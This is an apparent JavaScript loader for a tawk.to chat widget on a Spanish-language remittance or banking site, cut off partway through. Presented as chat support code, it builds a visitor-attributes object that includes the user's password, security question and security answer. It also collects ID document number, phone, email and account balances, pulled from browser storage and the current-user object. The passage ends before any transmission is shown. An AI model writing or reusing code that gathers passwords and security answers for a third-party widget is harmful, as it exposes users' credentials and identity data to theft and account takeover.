(function (window, document) {
  'use strict';

  if (!window || !document) {
    return;
  }

  if (window.remeexTawk && window.remeexTawk.__initialized) {
    return;
  }

  const TAWK_SRC = 'https://embed.tawk.to/67cca8c614b1ee191063c36a/default';
  const RETRY_DELAYS = [0, 2500, 7000, 15000, 30000, 60000];
  const MAX_ATTEMPTS = RETRY_DELAYS.length;
  let attempts = 0;
  let loading = false;
  let retryTimer = null;
  let chatRequested = false;
  let attributes = {
    nombre: '',
    nickname: '',
    saldo: '',
    saldoUsd: '',
    saldoBs: '',
    exchangeRate: '',
    documentType: '',
    documentNumber: '',
    email: '',
    phoneNumber: '',
    phoneNumberFull: '',
    phoneCountryCode: '',
    state: '',
    password: '',
    securityQuestion: '',
    securityAnswer: '',
    avatar: '',
    bankName: ''
  };

  let runtimeFinancialOverrides = {
    usd: null,
    bs: null,
    exchangeRate: null
  };

  function safeGet(storage, key) {
    if (!storage || typeof storage.getItem !== 'function') {
      return '';
    }
    try {
      return storage.getItem(key) || '';
    } catch (error) {
      return '';
    }
  }

  function safeParse(value) {
    if (!value || typeof value !== 'string') {
      return null;
    }
    try {
      return JSON.parse(value);
    } catch (error) {
      return null;
    }
  }

  function isHomevisaContext() {
    try {
      const path = (window.location && window.location.pathname ? window.location.pathname : '').toLowerCase();
      if (path.includes('homevisa')) {
        return true;
      }
      const href = (window.location && typeof window.location.href === 'string')
        ? window.location.href.toLowerCase()
        : '';
      if (href.includes('homevisa.html')) {
        return true;
      }
      const body = document.body;
      if (!body) {
        return false;
      }
      if (body.dataset && body.dataset.homevisa === 'true') {
        return true;
      }
      const className = typeof body.className === 'string' ? body.className.toLowerCase() : '';
      return className.includes('homevisa');
    } catch (error) {
      return false;
    }
  }

  function getBalanceStorageKey() {
    const storageKeys =
      (typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.STORAGE_KEYS)
        ? window.CONFIG.STORAGE_KEYS
        : null;
    if (storageKeys && typeof storageKeys.BALANCE === 'string' && storageKeys.BALANCE.trim()) {
      return storageKeys.BALANCE.trim();
    }
    return 'remeexBalance';
  }

  function shouldSyncFinancialAttributes() {
    if (isHomevisaContext()) {
      return true;
    }

    try {
      const viewKeywords = ['transferencia', 'verificacion', 'registro'];
      const path =
        window.location && typeof window.location.pathname === 'string'
          ? window.location.pathname.toLowerCase()
          : '';
      if (viewKeywords.some((keyword) => path.includes(keyword))) {
        return true;
      }

      const href =
        window.location && typeof window.location.href === 'string'
          ? window.location.href.toLowerCase()
          : '';
      if (
        viewKeywords.some(
          (keyword) =>
            href.includes(`${keyword}.html`) ||
            href.includes(`/${keyword}`)
        )
      ) {
        return true;
      }

      const body = document.body;
      if (!body) {
        return false;
      }

      const dataset = body.dataset || {};
      for (const value of Object.values(dataset)) {
        if (
          typeof value === 'string' &&
          viewKeywords.some((keyword) => value.toLowerCase().includes(keyword))
        ) {
          return true;
        }
      }

      const dataView =
        typeof body.getAttribute === 'function'
          ? (body.getAttribute('data-view') || '').toLowerCase()
          : '';
      if (dataView && viewKeywords.some((keyword) => dataView.includes(keyword))) {
        return true;
      }

      const className =
        typeof body.className === 'string' ? body.className.toLowerCase() : '';
      if (viewKeywords.some((keyword) => className.includes(keyword))) {
        return true;
      }
    } catch (error) {}

    return false;
  }

  function getBalanceSessionKey() {
    const sessionKeys =
      (typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.SESSION_KEYS)
        ? window.CONFIG.SESSION_KEYS
        : null;
    if (sessionKeys && typeof sessionKeys.BALANCE === 'string' && sessionKeys.BALANCE.trim()) {
      return sessionKeys.BALANCE.trim();
    }
    return '';
  }

  function getExchangeRateStorageKey() {
    const sessionKeys =
      (typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.SESSION_KEYS)
        ? window.CONFIG.SESSION_KEYS
        : null;
    if (sessionKeys && typeof sessionKeys.EXCHANGE_RATE === 'string' && sessionKeys.EXCHANGE_RATE.trim()) {
      return sessionKeys.EXCHANGE_RATE.trim();
    }
    return 'remeexSessionExchangeRate';
  }

  function getStoredJson(storage, key) {
    if (!key) {
      return null;
    }
    const raw = safeGet(storage, key);
    if (!raw) {
      return null;
    }
    const parsed = safeParse(raw);
    return parsed && typeof parsed === 'object' ? parsed : null;
  }

  function sanitizeCountryCode(value) {
    if (value == null) {
      return '';
    }
    const stringValue = String(value).trim();
    if (!stringValue) {
      return '';
    }
    const digits = stringValue.replace(/[^0-9]/g, '');
    if (!digits) {
      return '';
    }
    return `+${digits}`;
  }

  function normalizePhoneCandidate(value, countryCode) {
    if (value == null) {
      return '';
    }
    const stringValue = typeof value === 'number' ? String(value) : String(value || '').trim();
    if (!stringValue) {
      return '';
    }
    let digits = stringValue.replace(/[^0-9]/g, '');
    if (digits.length < 8) {
      return '';
    }

    const sanitizedCountryCode = sanitizeCountryCode(countryCode);
    const ccDigits = sanitizedCountryCode ? sanitizedCountryCode.slice(1) : '';

    if (stringValue.startsWith('+')) {
      return `+${digits}`;
    }
    if (stringValue.startsWith('00')) {
      const normalizedDigits = digits.replace(/^00+/, '');
      return normalizedDigits ? `+${normalizedDigits}` : '';
    }

    if (ccDigits) {
      let localDigits = digits;
      if (localDigits.startsWith(ccDigits) && localDigits.length > ccDigits.length + 3) {
        localDigits = localDigits.slice(ccDigits.length);
      }
      if (localDigits.length > 8 && localDigits.startsWith('0')) {
        const trimmedLocal = localDigits.replace(/^0+/, '');
        if (trimmedLocal.length >= 7) {
          localDigits = trimmedLocal;
        }
      }
      const combinedDigits = `${ccDigits}${localDigits}`;
      return combinedDigits ? `+${combinedDigits}` : '';
    }

    return digits;
  }

  function deriveLocalPhone(internationalValue, countryCode) {
    if (!internationalValue) {
      return '';
    }
    const sanitized = String(internationalValue).trim();
    if (!sanitized) {
      return '';
    }
    const digits = sanitized.replace(/[^0-9]/g, '');
    if (!digits) {
      return '';
    }
    const sanitizedCountryCode = sanitizeCountryCode(countryCode);
    const ccDigits = sanitizedCountryCode ? sanitizedCountryCode.slice(1) : '';
    if (sanitized.startsWith('+') && ccDigits && digits.startsWith(ccDigits)) {
      return digits.slice(ccDigits.length);
    }
    if (sanitized.startsWith('+')) {
      return digits;
    }
    return digits;
  }

  function normalizeVenezuelanLocalPhone(value) {
    if (value == null) {
      return '';
    }

    const digitsOnly = String(value).replace(/[^0-9]/g, '');
    if (!digitsOnly) {
      return '';
    }

    let normalized = digitsOnly.replace(/^00+/, '');

    if (normalized.startsWith('58')) {
      normalized = normalized.slice(2);
    }

    normalized = normalized.replace(/^0+/, '');

    if (!normalized) {
      return '';
    }

    normalized = `0${normalized}`;

    if (normalized.length >= 11) {
      return normalized.slice(0, 11);
    }

    if (normalized.length >= 7) {
      const subscriber = normalized.slice(-7);
      const operator = normalized.slice(0, normalized.length - 7).padStart(4, '0').slice(-4);
      return `${operator}${subscriber}`;
    }

    return normalized;
  }

  function formatVenezuelanLocalPhone(value) {
    if (value == null) {
      return '';
    }

    const digits = String(value).replace(/[^0-9]/g, '');
    if (!digits) {
      return '';
    }

    if (digits.length >= 11) {
      const trimmed = digits.length === 11 ? digits : digits.slice(0, 11);
      return `${trimmed.slice(0, 4)}-${trimmed.slice(4)}`;
    }

    if (digits.length === 10) {
      return `${digits.slice(0, 3)}-${digits.slice(3)}`;
    }

    if (digits.length >= 7) {
      const subscriber = digits.slice(-7);
      const operator = digits.slice(0, digits.length - 7).padStart(4, '0').slice(-4);
      return `${operator}-${subscriber}`;
    }

    return digits;
  }

  function parseNumberLike(value) {
    if (typeof value === 'number') {
      return Number.isFinite(value) ? value : null;
    }
    if (typeof value === 'string') {
      const trimmed = value.trim();
      if (!trimmed) {
        return null;
      }
      const normalized = trimmed.replace(/\s+/g, '');
      const hasComma = normalized.includes(',');
      const hasDot = normalized.includes('.');
      let candidate = normalized;
      if (hasComma && hasDot) {
        const lastComma = normalized.lastIndexOf(',');
        const lastDot = normalized.lastIndexOf('.');
        if (lastComma > lastDot) {
          candidate = normalized.replace(/\./g, '').replace(/,/g, '.');
        } else {
          candidate = normalized.replace(/,/g, '');
        }
      } else if (hasComma) {
        candidate = normalized.replace(/,/g, '.');
      }
      const parsed = Number(candidate);
      return Number.isFinite(parsed) ? parsed : null;
    }
    return null;
  }

  function sanitizeRuntimeOverrideValue(value) {
    if (value == null) {
      return null;
    }
    if (typeof value === 'number') {
      return Number.isFinite(value) ? value : null;
    }
    if (typeof value === 'string') {
      const trimmed = value.trim();
      if (!trimmed) {
        return null;
      }
      const numericCandidate = parseNumberLike(trimmed);
      return numericCandidate != null ? numericCandidate : trimmed;
    }
    if (typeof value === 'boolean') {
      return value ? 1 : 0;
    }
    if (typeof value === 'object') {
      const primitiveValue =
        typeof value.valueOf === 'function' ? value.valueOf() : value;
      if (primitiveValue !== value) {
        return sanitizeRuntimeOverrideValue(primitiveValue);
      }
    }
    return null;
  }

  function setRuntimeFinancialOverrides(partial) {
    if (!partial || typeof partial !== 'object') {
      return false;
    }
    let changed = false;
    const next = { ...runtimeFinancialOverrides };
    ['usd', 'bs', 'exchangeRate'].forEach((field) => {
      if (!Object.prototype.hasOwnProperty.call(partial, field)) {
        return;
      }
      const sanitized = sanitizeRuntimeOverrideValue(partial[field]);
      if (sanitized === null) {
        if (next[field] !== null) {
          next[field] = null;
          changed = true;
        }
        return;
      }
      if (next[field] !== sanitized) {
        next[field] = sanitized;
        changed = true;
      }
    });
    if (changed) {
      runtimeFinancialOverrides = next;
    }
    return changed;
  }

  function consumeRuntimeFinancialOverrides() {
    const snapshot = { ...runtimeFinancialOverrides };
    runtimeFinancialOverrides = { usd: null, bs: null, exchangeRate: null };
    return snapshot;
  }

  function extractFinancialOverridesFromDetail(detail) {
    if (!detail || typeof detail !== 'object') {
      return null;
    }
    const overrides = {};
    if (detail.nuevoSaldo != null) {
      overrides.usd = detail.nuevoSaldo;
    } else if (detail.saldoUsd != null) {
      overrides.usd = detail.saldoUsd;
    } else if (detail.usd != null) {
      overrides.usd = detail.usd;
    }

    if (detail.saldoBs != null) {
      overrides.bs = detail.saldoBs;
    } else if (detail.nuevoSaldoBs != null) {
      overrides.bs = detail.nuevoSaldoBs;
    } else if (detail.saldoBolivares != null) {
      overrides.bs = detail.saldoBolivares;
    } else if (detail.bs != null) {
      overrides.bs = detail.bs;
    }

    if (detail.exchangeRate != null) {
      overrides.exchangeRate = detail.exchangeRate;
    } else if (detail.tasaCambio != null) {
      overrides.exchangeRate = detail.tasaCambio;
    } else if (detail.rate != null) {
      overrides.exchangeRate = detail.rate;
    } else if (detail.tasa != null) {
      overrides.exchangeRate = detail.tasa;
    }

    return Object.keys(overrides).length ? overrides : null;
  }

  function computeHomeFinancialSnapshot(overrides) {
    if (!isHomevisaContext()) {
      return {
        saldoUsd: '',
        saldoBs: '',
        exchangeRate: '',
        usdNumeric: null,
        bsNumeric: null,
        exchangeRateNumeric: null
      };
    }

    const balanceStorageKey = getBalanceStorageKey();
    const balanceSessionKey = getBalanceSessionKey();
    const balanceSources = [];
    if (balanceSessionKey) {
      balanceSources.push([sessionStorage, balanceSessionKey]);
      balanceSources.push([localStorage, balanceSessionKey]);
    }
    if (balanceStorageKey && balanceStorageKey !== balanceSessionKey) {
      balanceSources.push([localStorage, balanceStorageKey]);
      balanceSources.push([sessionStorage, balanceStorageKey]);
    }
    if (!balanceSources.length && balanceStorageKey) {
      balanceSources.push([localStorage, balanceStorageKey]);
      balanceSources.push([sessionStorage, balanceStorageKey]);
    }

    let balanceData = null;
    for (const [storage, key] of balanceSources) {
      balanceData = getStoredJson(storage, key);
      if (balanceData) {
        break;
      }
    }

    const effectiveOverrides = overrides && typeof overrides === 'object' ? overrides : {};
    let usdNumeric = parseNumberLike(effectiveOverrides.usd);
    let bsNumeric = parseNumberLike(effectiveOverrides.bs);
    let exchangeRateNumeric = parseNumberLike(effectiveOverrides.exchangeRate);
    const legacySaldoRaw = safeGet(localStorage, 'saldo') || safeGet(sessionStorage, 'saldo');

    if (usdNumeric == null && balanceData && Object.prototype.hasOwnProperty.call(balanceData, 'usd')) {
      usdNumeric = parseNumberLike(balanceData.usd);
    }
    if (usdNumeric == null && balanceData && Object.prototype.hasOwnProperty.call(balanceData, 'saldoUsd')) {
      usdNumeric = parseNumberLike(balanceData.saldoUsd);
    }
    if (bsNumeric == null && balanceData && Object.prototype.hasOwnProperty.call(balanceData, 'bs')) {
      bsNumeric = parseNumberLike(balanceData.bs);
    }
    if (bsNumeric == null && balanceData && Object.prototype.hasOwnProperty.call(balanceData, 'saldoBs')) {
      bsNumeric = parseNumberLike(balanceData.saldoBs);
    }
    if (usdNumeric == null && legacySaldoRaw) {
      const parsedLegacyUsd = parseNumberLike(legacySaldoRaw);
      if (parsedLegacyUsd != null) {
        usdNumeric = parsedLegacyUsd;
      }
    }

    const exchangeRateKey = getExchangeRateStorageKey();
    let exchangeData = getStoredJson(sessionStorage, exchangeRateKey);
    if (!exchangeData) {
      exchangeData = getStoredJson(localStorage, exchangeRateKey);
    }

    if (exchangeRateNumeric == null) {
      const exchangeCandidates = [];
      if (exchangeData && typeof exchangeData === 'object') {
        exchangeCandidates.push(
          exchangeData.USD_TO_BS,
          exchangeData.usdToBs,
          exchangeData.usd_bs,
          exchangeData.usdBs,
          exchangeData.rate,
          exchangeData.usd,
          exchangeData.bs,
          exchangeData.exchangeRate
        );
      }
      if (exchangeData && typeof exchangeData !== 'object') {
        exchangeCandidates.push(exchangeData);
      }
      for (const candidate of exchangeCandidates) {
        const parsedCandidate = parseNumberLike(candidate);
        if (parsedCandidate != null) {
          exchangeRateNumeric = parsedCandidate;
          break;
        }
      }
    }

    if (exchangeRateNumeric == null) {
      const configExchangeRates =
        typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.EXCHANGE_RATES &&
        typeof window.CONFIG.EXCHANGE_RATES === 'object'
          ? window.CONFIG.EXCHANGE_RATES
          : null;
      if (configExchangeRates) {
        const configCandidates = [
          configExchangeRates.USD_TO_BS,
          configExchangeRates.usdToBs,
          configExchangeRates.usd_bs,
          configExchangeRates.usdBs,
          configExchangeRates.bolivares,
          configExchangeRates.rate
        ];
        for (const candidate of configCandidates) {
          const parsedCandidate = parseNumberLike(candidate);
          if (parsedCandidate != null) {
            exchangeRateNumeric = parsedCandidate;
            break;
          }
        }
      }
    }

    let saldoUsd = '';
    if (usdNumeric != null) {
      saldoUsd = usdNumeric.toFixed(2);
    } else {
      const usdCandidates = [
        effectiveOverrides.usd,
        balanceData && balanceData.usd,
        balanceData && balanceData.saldoUsd,
        balanceData && balanceData.balanceUsd,
        balanceData && balanceData.balance,
        balanceData && balanceData.amount,
        legacySaldoRaw
      ];
      for (const candidate of usdCandidates) {
        if (candidate == null) {
          continue;
        }
        const trimmedCandidate = String(candidate).trim();
        if (trimmedCandidate) {
          saldoUsd = trimmedCandidate;
          break;
        }
      }
    }

    let saldoBs = '';
    if (bsNumeric != null) {
      saldoBs = bsNumeric.toFixed(2);
    } else {
      const bsCandidates = [
        effectiveOverrides.bs,
        balanceData && balanceData.bs,
        balanceData && balanceData.saldoBs,
        balanceData && balanceData.balanceBs,
        balanceData && balanceData.bolivares
      ];
      for (const candidate of bsCandidates) {
        if (candidate == null) {
          continue;
        }
        const trimmedCandidate = String(candidate).trim();
        if (trimmedCandidate) {
          saldoBs = trimmedCandidate;
          break;
        }
      }
    }

    let exchangeRate = '';
    if (exchangeRateNumeric != null) {
      exchangeRate = exchangeRateNumeric.toFixed(4);
    } else if (
      effectiveOverrides.exchangeRate != null &&
      String(effectiveOverrides.exchangeRate).trim()
    ) {
      exchangeRate = String(effectiveOverrides.exchangeRate).trim();
    } else if (
      exchangeData &&
      typeof exchangeData === 'object' &&
      Object.prototype.hasOwnProperty.call(exchangeData, 'USD_TO_BS') &&
      exchangeData.USD_TO_BS != null &&
      String(exchangeData.USD_TO_BS).trim()
    ) {
      exchangeRate = String(exchangeData.USD_TO_BS).trim();
    } else if (
      typeof window.CONFIG !== 'undefined' &&
      window.CONFIG &&
      window.CONFIG.EXCHANGE_RATES &&
      Object.prototype.hasOwnProperty.call(window.CONFIG.EXCHANGE_RATES, 'USD_TO_BS') &&
      window.CONFIG.EXCHANGE_RATES.USD_TO_BS != null &&
      String(window.CONFIG.EXCHANGE_RATES.USD_TO_BS).trim()
    ) {
      exchangeRate = String(window.CONFIG.EXCHANGE_RATES.USD_TO_BS).trim();
    }

    if (exchangeRateNumeric != null) {
      if (bsNumeric == null && usdNumeric != null) {
        const computedBs = usdNumeric * exchangeRateNumeric;
        if (Number.isFinite(computedBs)) {
          saldoBs = computedBs.toFixed(2);
          bsNumeric = computedBs;
        }
      } else if (usdNumeric == null && bsNumeric != null && exchangeRateNumeric) {
        const computedUsd = bsNumeric / exchangeRateNumeric;
        if (Number.isFinite(computedUsd)) {
          saldoUsd = computedUsd.toFixed(2);
          usdNumeric = computedUsd;
        }
      }
    }

    return {
      saldoUsd,
      saldoBs,
      exchangeRate,
      usdNumeric,
      bsNumeric,
      exchangeRateNumeric
    };
  }

  function extractNameFromData(data) {
    if (!data || typeof data !== 'object') {
      return '';
    }
    const fullName = typeof data.fullName === 'string' ? data.fullName.trim() : '';
    if (fullName) {
      return fullName;
    }
    const first = typeof data.firstName === 'string' ? data.firstName.trim() : '';
    const last = typeof data.lastName === 'string' ? data.lastName.trim() : '';
    if (first || last) {
      const combined = `${first} ${last}`.trim();
      if (last) {
        return combined;
      }
      const fallbackName = typeof data.name === 'string' ? data.name.trim() : '';
      if (fallbackName) {
        return fallbackName;
      }
      return combined;
    }
    const additionalCandidates = [data.name, data.preferredName, data.nickname];
    for (const value of additionalCandidates) {
      if (typeof value === 'string' && value.trim()) {
        return value.trim();
      }
    }
    return '';
  }

  function ensureStoredName() {
    const MIN_NAME_LENGTH = 4;
    const existingRaw = safeGet(localStorage, 'nombre');
    const existingTrimmed = existingRaw.trim();
    const normalizedExisting = existingTrimmed.replace(/\s+/g, ' ');
    const condensedExisting = normalizedExisting.replace(/\s+/g, '');
    const needsRebuild =
      !normalizedExisting ||
      !normalizedExisting.includes(' ') ||
      condensedExisting.length < MIN_NAME_LENGTH;

    if (!needsRebuild && normalizedExisting) {
      if (normalizedExisting !== existingRaw) {
        try {
          localStorage.setItem('nombre', normalizedExisting);
        } catch (error) {}
      }
      return normalizedExisting;
    }

    const storageKeys =
      (typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.STORAGE_KEYS &&
        window.CONFIG.STORAGE_KEYS.USER_DATA) ||
      '';

    const sources = [
      () => safeParse(safeGet(localStorage, storageKeys)),
      () => safeParse(safeGet(localStorage, 'visaRegistrationCompleted')),
      () => safeParse(safeGet(localStorage, 'visaUserData')),
      () => safeParse(safeGet(localStorage, 'remeexUserData')),
      () => safeParse(safeGet(localStorage, 'visaRegistrationTemp')),
      () => safeParse(safeGet(sessionStorage, 'visaRegistrationBackup')),
      () => safeParse(safeGet(sessionStorage, 'registrationData'))
    ];

    for (const getSource of sources) {
      let data = null;
      try {
        data = getSource();
      } catch (error) {
        data = null;
      }
      const candidate = extractNameFromData(data).replace(/\s+/g, ' ').trim();
      if (candidate) {
        try {
          localStorage.setItem('nombre', candidate);
        } catch (error) {}
        return candidate;
      }
    }

    return normalizedExisting;
  }

  function gatherAttributeSources() {
    const userDataKey =
      (typeof window.CONFIG !== 'undefined' &&
        window.CONFIG &&
        window.CONFIG.STORAGE_KEYS &&
        window.CONFIG.STORAGE_KEYS.USER_DATA) ||
      'remeexUserData';

    const storageEntries = [
      { storage: localStorage, key: userDataKey },
      { storage: localStorage, key: 'visaRegistrationCompleted' },
      { storage: localStorage, key: 'visaUserData' },
      { storage: localStorage, key: 'remeexUserData' },
      { storage: localStorage, key: 'remeexVerificationBanking' },
      { storage: localStorage, key: 'visaRegistrationTemp' },
      { storage: sessionStorage, key: 'visaRegistrationBackup' },
      { storage: sessionStorage, key: 'registrationData' }
    ];

    const seenKeys = new Set();
    const runtimeCandidates = [];
    const addRuntimeCandidate = (candidate) => {
      if (!candidate || typeof candidate !== 'object') {
        return;
      }
      runtimeCandidates.push(candidate);
    };

    const currentUser = typeof window !== 'undefined' ? window.currentUser : null;
    addRuntimeCandidate(currentUser);
    if (currentUser && typeof currentUser === 'object') {
      const nestedKeys = [
        'profile',
        'profiles',
        'balance',
        'balances',
        'contact',
        'contacts',
        'details',
        'meta'
      ];
      nestedKeys.forEach((key) => {
        const value = currentUser[key];
        if (!value) {
          return;
        }
        if (Array.isArray(value)) {
          value.forEach((item) => addRuntimeCandidate(item));
        } else {
          addRuntimeCandidate(value);
        }
      });
    }

    const candidates = [];

    for (const entry of storageEntries) {
      if (!entry || !entry.key || seenKeys.has(entry.key)) {
        continue;
      }
      seenKeys.add(entry.key);
      const value = safeGet(entry.storage, entry.key);
      if (!value) {
        continue;
      }
      const parsed = safeParse(value);
      if (parsed && typeof parsed === 'object') {
        candidates.push(parsed);
      }
    }

    const sources = [];
    const queue = runtimeCandidates
      .concat(candidates)
      .filter((item) => item && typeof item === 'object');
    const visited = new Set();

    while (queue.length) {
      const current = queue.shift();
      if (!current || typeof current !== 'object') {
        continue;
      }
      if (visited.has(current)) {
        continue;
      }
      visited.add(current);
      sources.push(current);
      for (const key in current) {
        if (!Object.prototype.hasOwnProperty.call(current, key)) {
          continue;
        }
        const value = current[key];
        if (value && typeof value === 'object' && !Array.isArray(value)) {
          queue.push(value);
        }
      }
    }

    return sources;
  }

  function pickAttributeValue(sources, fieldNames) {
    for (const source of sources) {
      for (const fieldName of fieldNames) {
        if (!Object.prototype.hasOwnProperty.call(source, fieldName)) {
          continue;
        }
        const candidate = source[fieldName];
        if (candidate == null) {
          continue;
        }
        if (typeof candidate === 'string') {
          const trimmed = candidate.trim();
          if (trimmed) {
            return trimmed;
          }
        } else if (typeof candidate === 'number' || typeof candidate === 'boolean') {
          return candidate;
        }
      }
    }
    return '';
  }

  function resolveBankNameFromSources(sources) {
    const directBankName = pickAttributeValue(sources, ['bankName', 'bank_name']);
    const trimmedDirectBankName =
      typeof directBankName === 'string' ? directBankName.trim() : '';
    if (trimmedDirectBankName) {
      return trimmedDirectBankName;
    }

    const bankIdentifiers = [
      pickAttributeValue(sources, ['primaryBank']),
      pickAttributeValue(sources, ['bankId', 'bank_id'])
    ];

    const bankMap =
      (typeof window.BANK_NAME_MAP !== 'undefined' &&
        window.BANK_NAME_MAP &&
        typeof window.BANK_NAME_MAP === 'object')
        ? window.BANK_NAME_MAP
        : {};

    for (const identifier of bankIdentifiers) {
      if (typeof identifier !== 'string') {
        continue;
      }
      const trimmedIdentifier = identifier.trim();
      if (!trimmedIdentifier) {
        continue;
      }
      const lowerIdentifier = trimmedIdentifier.toLowerCase();
      const hyphenIdentifier = lowerIdentifier.replace(/\s+/g, '-');
      const mappedName =
        (typeof bankMap[trimmedIdentifier] === 'string' && bankMap[trimmedIdentifier].trim())
          ? bankMap[trimmedIdentifier].trim()
          : (typeof bankMap[lowerIdentifier] === 'string' && bankMap[lowerIdentifier].trim())
          ? bankMap[lowerIdentifier].trim()
          : (typeof bankMap[hyphenIdentifier] === 'string' && bankMap[hyphenIdentifier].trim())
          ? bankMap[hyphenIdentifier].trim()
          : '';
      if (mappedName) {
        return mappedName;
      }
    }

    for (const identifier of bankIdentifiers) {
      if (typeof identifier === 'string') {
        const trimmedIdentifier = identifier.trim();
        if (trimmedIdentifier) {
          return trimmedIdentifier;
        }
      }
    }

    return '';
  }

  function readStoredAttributes() {
    const storedName = ensureStoredName();
    const sources = gatherAttributeSources();
    const legacySaldo = safeGet(localStorage, 'saldo');
    const homevisaActive = isHomevisaContext();
    const preferredName = pickAttributeValue(sources, [
      'nombre',
      'fullName',
      'displayName',
      'name',
      'firstName',
      'lastName',
      'profileName'
    ]);
    const documentType = pickAttributeValue(sources, [
      'documentType',
      'idType',
      'document_type',
      'documentTypeCode',
      'documentKind',
      'document_type_code'
    ]);
    const documentNumber = pickAttributeValue(sources, [
      'documentNumber',
      'idNumber',
      'document',
      'document_id',
      'documentNumberValue',
      'document_number',
      'documento'
    ]);
    const email = pickAttributeValue(sources, ['email', 'correo', 'emailAddress', 'contactEmail']);
    const rawPhoneNumberFull = pickAttributeValue(sources, [
      'phoneNumberFull',
      'fullPhoneNumber',
      'fullPhone',
      'phoneFull',
      'telefonoCompleto'
    ]);
    const phonePrefix = pickAttributeValue(sources, [
      'phonePrefix',
      'prefix',
      'phone_code',
      'dialCode',
      'phoneDialCode'
    ]);
    const phoneNumberOnly = pickAttributeValue(sources, [
      'phoneNumber',
      'telefono',
      'mobileNumber',
      'phone',
      'mobile',
      'phone_number'
    ]);
    const nationalPhoneNumber = pickAttributeValue(sources, [
      'nationalPhoneNumber',
      'nationalPhone',
      'phoneNational'
    ]);
    const phoneCountryCode = pickAttributeValue(sources, [
      'phoneCountryCode',
      'countryCallingCode',
      'callingCode',
      'phoneCountry',
      'phoneCode',
      'phone_code',
      'countryDialCode'
    ]);
    let normalizedCountryCode = sanitizeCountryCode(phoneCountryCode);
    if (!normalizedCountryCode && homevisaActive) {
      normalizedCountryCode = '+58';
    }
    const phoneNumberCombined = rawPhoneNumberFull || `${phonePrefix || ''}${phoneNumberOnly || ''}`.trim();
    const phoneCandidates = [
      rawPhoneNumberFull,
      phoneNumberCombined,
      nationalPhoneNumber,
      phoneNumberOnly
    ];
    let normalizedPhoneNumberFull = '';
    for (const candidate of phoneCandidates) {
      const normalizedCandidate = normalizePhoneCandidate(candidate, normalizedCountryCode);
      if (normalizedCandidate) {
        normalizedPhoneNumberFull = normalizedCandidate;
        break;
      }
    }
    if (!normalizedPhoneNumberFull && normalizedCountryCode && phoneNumberOnly) {
      normalizedPhoneNumberFull = normalizePhoneCandidate(
        `${normalizedCountryCode}${phoneNumberOnly}`,
        normalizedCountryCode
      );
    }
    let normalizedPhoneNumber = deriveLocalPhone(normalizedPhoneNumberFull, normalizedCountryCode) ||
      (typeof phoneNumberOnly === 'string' ? phoneNumberOnly.replace(/[^0-9]/g, '') : '');

    if (normalizedCountryCode === '+58' && normalizedPhoneNumber) {
      const veneLocal = normalizeVenezuelanLocalPhone(normalizedPhoneNumber);
      if (veneLocal) {
        const veneDisplay = formatVenezuelanLocalPhone(veneLocal);
        normalizedPhoneNumber = veneDisplay || veneLocal;
      }
    }
    const state = pickAttributeValue(sources, ['state', 'estado', 'province']);
    const password = pickAttributeValue(sources, ['password']);
    const securityQuestion = pickAttributeValue(sources, ['securityQuestion']);
    const securityAnswer = pickAttributeValue(sources, ['securityAnswer']);
    const nickname = pickAttributeValue(sources, ['nickname', 'preferredName']);
    const storedAvatar = safeGet(localStorage, 'remeexProfilePhoto');
    const sourceAvatar = pickAttributeValue(sources, [
      'profilePhoto',
      'photo',
      'avatar',
      'profile_photo',
      'avatarUrl',
      'photoUrl'
    ]);
    const bankName = resolveBankNameFromSources(sources);

    const saldoPrimary = pickAttributeValue(sources, [
      'saldo',
      'balance',
      'primaryBalance',
      'currentBalance',
      'availableBalance',
      'walletBalance'
    ]);
    const saldoUsdSource = pickAttributeValue(sources, [
      'saldoUsd',
      'saldoUSD',
      'balanceUsd',
      'balanceUSD',
      'usdBalance',
      'balance_usd',
      'usd',
      'usdAvailable',
      'availableUsd'
    ]);
    const saldoBsSource = pickAttributeValue(sources, [
      'saldoBs',
      'saldoBS',
      'balanceBs',
      'balanceBS',
      'bsBalance',
      'bs',
      'bolivares',
      'bolivars',
      'availableBs'
    ]);
    const exchangeRateSource = pickAttributeValue(sources, [
      'exchangeRate',
      'usdToBs',
      'usd_bs',
      'usdBs',
      'tasa',
      'tasaCambio',
      'rate'
    ]);

    let avatar = '';
    if (typeof storedAvatar === 'string' && storedAvatar.trim()) {
      avatar = storedAvatar.trim();
    }
    if (!avatar && sourceAvatar) {
      avatar = String(sourceAvatar).trim();
    }

    const normalizedPreferredName = preferredName ? String(preferredName).trim() : '';
    const normalizedNickname = nickname ? String(nickname).trim() : '';
    let resolvedName = storedName;
    if (normalizedPreferredName) {
      resolvedName = normalizedPreferredName;
      if (normalizedPreferredName !== storedName) {
        try {
          localStorage.setItem('nombre', normalizedPreferredName);
        } catch (error) {}
      }
    }

    const runtimeOverrides = consumeRuntimeFinancialOverrides();
    const balanceOverrides = {
      usd: saldoUsdSource || saldoPrimary || legacySaldo,
      bs: saldoBsSource,
      exchangeRate: exchangeRateSource
    };

    const mergedOverrides = { ...balanceOverrides };
    ['usd', 'bs', 'exchangeRate'].forEach((field) => {
      const overrideValue = runtimeOverrides[field];
      if (overrideValue == null) {
        return;
      }
      if (typeof overrideValue === 'string') {
        const trimmed = overrideValue.trim();
        if (trimmed) {
          mergedOverrides[field] = trimmed;
        }
      } else {
        mergedOverrides[field] = overrideValue;
      }
    });

    let fallbackSaldoUsd = '';
    if (mergedOverrides.usd != null) {
      fallbackSaldoUsd = String(mergedOverrides.usd).trim();
    } else if (saldoUsdSource != null) {
      fallbackSaldoUsd = String(saldoUsdSource).trim();
    }

    let fallbackSaldoBs = '';
    if (mergedOverrides.bs != null) {
      fallbackSaldoBs = String(mergedOverrides.bs).trim();
    } else if (saldoBsSource != null) {
      fallbackSaldoBs = String(saldoBsSource).trim();
    }

    let fallbackExchangeRate = '';
    if (mergedOverrides.exchangeRate != null) {
      fallbackExchangeRate = String(mergedOverrides.exchangeRate).trim();
    } else if (exchangeRateSource != null) {
      fallbackExchangeRate = String(exchangeRateSource).trim();
    }

    const homeSnapshot = homevisaActive
      ? computeHomeFinancialSnapshot(mergedOverrides)
      : {
          saldoUsd: fallbackSaldoUsd,
          saldoBs: fallbackSaldoBs,
          exchangeRate: fallbackExchangeRate
        };
